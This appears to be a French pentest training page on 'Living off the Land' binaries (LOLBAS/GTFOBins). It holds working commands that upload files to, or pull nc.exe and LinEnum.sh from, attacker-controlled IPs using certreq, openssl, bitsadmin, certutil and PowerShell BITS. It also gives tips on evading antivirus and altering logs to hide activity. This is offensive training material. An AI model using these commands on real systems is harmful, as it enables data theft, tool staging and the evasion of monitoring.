# Living off the Land

## <mark style="color:red;">Qu'est-ce que "Living off the Land" ?</mark>

Le terme **"Living off the Land"** (LOL) désigne l'utilisation de binaires ou de fonctions disponibles nativement sur le système d'exploitation pour exécuter des actions malveillantes. Ces outils sont appelés **LOLBins** (Living off the Land Binaries).

Ces binaires peuvent être utilisés pour :

* **Télécharger** des fichiers
* **Uploader** des fichiers
* **Exécuter des commandes**
* **Lire** et **écrire** des fichiers
* **Contourner** certaines mesures de sécurité

Les deux principaux projets qui documentent ces binaires sont :

1. **LOLBAS** (Living Off the Land Binaries and Scripts) pour Windows
2. **GTFOBins** pour Linux

***

## <mark style="color:red;">Principales Commandes et Binaries Utilisés</mark>

1.  <mark style="color:green;">**CertReq.exe (Windows)**</mark>

    Utilisation : Souvent utilisé pour soumettre des requêtes de certificats, mais peut être utilisé pour transférer des fichiers via des requêtes HTTP.

<mark style="color:orange;">**Exemple : Uploader le fichier win.ini vers un serveur distant :**</mark>

{% code fullWidth="true" %}
```powershell
certreq.exe -Post -config http://192.168.49.128:8000/ C:\windows\win.ini
```
{% endcode %}

<mark style="color:orange;">**File Received in our Netcat Session**</mark>

{% code fullWidth="true" %}
```bash
mrroboteLiot@htb[/htb]$ sudo nc -lvnp 8000

listening on [any] 8000 ...
connect to [192.168.49.128] from (UNKNOWN) [192.168.49.1] 53819
POST / HTTP/1.1
Cache-Control: no-cache
Connection: Keep-Alive
Pragma: no-cache
Content-Type: application/json
User-Agent: Mozilla/4.0 (compatible; Win32; NDES client 10.0.19041.1466/vb_release_svc_prod1)
Content-Length: 92
Host: 192.168.49.128:8000

; for 16-bit app support
[fonts]
[extensions]
[mci extensions]
[files]
[Mail]
MAPI=1
```
{% endcode %}

2.  <mark style="color:green;">**OpenSSL (Linux)**</mark>

    Utilisation : Utilisé pour la génération de certificats, peut également servir à transférer des fichiers de manière similaire à nc.

<mark style="color:orange;">**Exemple : Créer un certificat et démarrer un serveur pour transférer un fichier :**</mark>

{% code overflow="wrap" fullWidth="true" %}
```sh
openssl req -newkey rsa:2048 -nodes -keyout key.pem -x509 -days 365 -out certificate.pem openssl s_server -quiet -accept 80 -cert certificate.pem -key key.pem < /tmp/LinEnum.sh
```
{% endcode %}

<mark style="color:orange;">**Télécharger le fichier depuis une machine compromise :**</mark>

{% code fullWidth="true" %}
```
openssl s_client -connect 10.10.10.32:80 -quiet > LinEnum.sh
```
{% endcode %}

3.  <mark style="color:green;">**Bitsadmin (Windows)**</mark>

    Utilisation : Permet le téléchargement de fichiers via HTTP/SMB en utilisant le service BITS. Cette méthode minimise l'impact sur les utilisateurs.

<mark style="color:orange;">**Exemple : Télécharger un fichier avec bitsadmin :**</mark>

{% code overflow="wrap" fullWidth="true" %}
```powershell
bitsadmin /transfer wcb /priority foreground http://10.10.15.66:8000/nc.exe C:\Users\htb-student\Desktop\nc.exe
```
{% endcode %}

4.  <mark style="color:green;">**Certutil (Windows)**</mark>

    Utilisation : Outil intégré utilisé pour gérer les certificats, mais peut être détourné pour télécharger des fichiers à distance.

<mark style="color:orange;">**Exemple : Télécharger un fichier avec certutil :**</mark>

{% code fullWidth="true" %}
```powershell
certutil.exe -verifyctl -split -f http://10.10.10.32:8000/nc.exe
```
{% endcode %}

5.  <mark style="color:green;">**PowerShell et BITS (Windows)**</mark>

    Utilisation : PowerShell permet une interaction avancée avec BITS pour télécharger des fichiers.

Exemple : Télécharger un fichier avec PowerShell :

{% code overflow="wrap" fullWidth="true" %}
```powershell
Import-Module bitstransfer Start-BitsTransfer -Source "http://10.10.10.32:8000/nc.exe" -Destination "C:\Windows\Temp\nc.exe"
```
{% endcode %}

***

## <mark style="color:red;">Autres Binaries Utilisés pour le Living off the Land</mark>

Il existe de nombreux autres binaires qui peuvent être utilisés de manière détournée. Voici quelques autres exemples :

```
Msiexec : Installation de fichiers MSI via HTTP
Regsvr32 : Chargement et exécution de DLL à distance
Rundll32 : Exécution de code à partir de DLL
Wmic : Exécution de commandes système ou téléchargement de fichiers
```

Sites Web Utiles

```
LOLBAS Project : https://lolbas-project.github.io/
GTFOBins : https://gtfobins.github.io/
```

Conseils pour l'utilisation de LOLBins

```
Testez les différentes méthodes : Plus vous connaissez de techniques, plus vous serez efficace lors d'un audit.
Évitez la détection : Certains outils comme certutil sont de plus en plus détectés par les systèmes de sécurité. Utilisez des méthodes plus obscures pour éviter d'être détecté.
```

Détection et Contournement

```
Antivirus : Certains antivirus détectent les LOLBins comme des actions malveillantes. Cherchez des alternatives moins courantes.
Journalisation : L'utilisation des LOLBins peut laisser des traces dans les logs système, pensez à masquer vos actions en modifiant les configurations log.
```
